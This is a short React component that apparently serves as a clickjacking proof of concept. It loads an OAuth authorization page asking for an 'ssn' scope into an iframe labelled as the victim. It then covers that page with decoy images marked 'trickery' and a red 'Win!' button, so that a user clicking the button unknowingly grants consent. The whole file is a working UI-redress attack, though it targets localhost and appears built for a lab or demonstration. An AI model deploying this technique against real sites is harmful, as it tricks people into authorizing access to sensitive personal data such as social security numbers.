import React from 'react';
import './App.css';
import Iframe from 'react-iframe';
import Button from 'react-bootstrap/Button';

const App = () => {
  const URL = "https://localhost:3002/authorize?response_type=code&scopes=ssn&client_id=FSB&redirect_uri=https%3A%2F%2Flocalhost%3A5000%2Fcallback&state=8ct13nlaacgti4s5";
    
  return (
    <div className="App">
        <Iframe url={URL}
            width = "800px"
            height = "1024px"
            position = "absolute"
            className="App-victim-iframe"
            />           

          <img style={{position: "absolute", width: "200px", left: "5px", top: "130px"}} src="https://i.imgur.com/kDDFvUp.png" alt="trickery"/>
          <img style={{position: "absolute", width: "200px", left: "185px", top: "130px"}} src="https://i.imgur.com/kDDFvUp.png" alt="trickery"/>
          <img style={{position: "absolute", width: "200px", left: "365px", top: "130px"}} src="https://i.imgur.com/kDDFvUp.png" alt="trickery"/>
   
      <Button variant="danger" className="App-clickjack-button">
          Win!
      </Button>
    </div>
    
  );
}
export default App;